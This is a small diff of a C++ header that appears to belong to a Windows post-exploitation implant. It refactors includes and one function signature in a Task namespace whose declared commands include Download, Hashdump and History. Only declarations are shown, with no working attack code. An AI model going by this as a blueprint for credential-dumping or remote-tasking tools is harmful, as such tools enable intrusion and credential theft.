@@ -4,6 +4,7 @@
 #include <winsock2.h>
 
 #include "core/macros.hpp"
+#include "core/win32.hpp"
 #include "core/state.hpp"
 #include "core/stdout.hpp"
 #include "core/system.hpp"
@@ -12,8 +13,6 @@
 
 #include <ws2tcpip.h>
 #include <windows.h>
-#include <winhttp.h>
-#include <winreg.h>
 #include <dbghelp.h>
 #include <gdiplus.h>
 #include <iphlpapi.h>
@@ -141,7 +140,7 @@ namespace Task
     std::wstring Download(State::PSTATE pState, const std::wstring& wSrc, const std::wstring& wDest);
     std::wstring EnvLs(State::PSTATE pState);
     std::wstring Find(State::PSTATE pState, const std::wstring& wPath, const std::wstring& wName);
-    std::wstring GroupLs();
+    std::wstring GroupLs(State::PSTATE pState);
     std::wstring Hashdump(State::PSTATE pState);
     std::wstring History(State::PSTATE pState);
     std::wstring Ip();
